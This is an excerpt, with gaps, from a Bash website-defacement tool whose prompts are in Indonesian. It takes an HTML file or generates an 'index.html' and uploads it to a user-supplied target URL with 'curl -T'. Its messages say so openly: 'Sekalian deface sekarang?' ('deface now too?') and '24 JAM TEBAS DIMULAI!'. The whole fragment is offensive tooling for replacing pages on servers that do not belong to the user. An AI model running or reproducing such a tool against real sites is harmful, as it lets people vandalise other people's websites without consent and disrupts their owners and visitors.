...
if [[ "$jj" == "1" ]]; then
    ...
    read -p $'\e[32mScript HTML (path lengkap) ~> \e[0m' file

    if [[ ! -f "$file" ]]; then
        echo -e "\e[1;31mFile tidak ditemukan!\e[0m"
        exit 1
    fi

    echo -e "\e[1;32m[+] Uploading file ke: $target ...\e[0m"
    
    curl -T "$file" "$target"

    echo -e '\n\e[1;32m24 JAM TEBAS DIMULAI!\e[0m'
...
EOF
    ...
    echo -e "\e[1;32m[✔] File 'index.html' berhasil dibuat!\e[0m"
    read -p 'Sekalian deface sekarang? (y/t): ' y
    if [[ "$y" == "y" || "$y" == "Y" ]]; then
        read -p $'\e[32mTarget upload URL ~> \e[0m' target_url
        curl -T index.html "$target_url"
        echo -e "\e[1;32m[✔] File berhasil diupload ke $target_url\e[0m"
    else
        echo 'Bye!'
        exit
    fi
